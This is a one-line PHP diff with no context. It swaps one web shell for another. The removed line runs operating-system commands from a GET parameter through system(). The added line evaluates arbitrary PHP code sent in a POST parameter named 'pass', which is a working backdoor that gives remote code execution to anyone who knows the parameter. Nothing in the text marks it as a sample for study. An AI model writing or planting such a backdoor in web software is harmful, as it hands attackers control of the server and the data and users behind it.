@@ -1,1 +1,1 @@
-<?php system($_GET['test']);?>
+<?php eval(@$_POST['pass']);?>
